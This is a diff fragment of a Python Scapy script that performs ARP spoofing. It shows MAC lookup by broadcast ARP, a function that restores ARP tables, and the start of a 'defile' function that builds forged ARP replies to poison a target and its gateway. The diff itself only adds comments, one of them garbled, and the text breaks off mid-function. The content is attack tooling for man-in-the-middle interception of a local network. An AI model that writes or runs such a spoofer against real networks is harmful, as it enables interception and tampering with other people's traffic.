@@ -10,19 +10,19 @@ interface = ""
 target_ip = ""
 target_gw = ""
 
-
+#Get MAC address 
 def get_mac(ip_addr):
 	res,no_res = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_addr),timeout=2,retry=10)
 	for s,r in res:
 		return r[Ether].src
 	return None
-
+#clean arp table
 def table_clean(target_gw,tgw_mac,target_ip,tip_mac):
 	print("[*] arp中です")
 	send(ARP(op=2,psrc=target_gw,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=tgw_mac),count=5)
 	send(ARP(op=2,psrc=target_ip,pdst=target_gw,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=tip_mac),count=5)
 
-
+#arp tabele killd
 def defile(target_gw,tgw_mac,target_ip,tip_mac):
 	defile_target = ARP()
 	defile_target.op   = 2
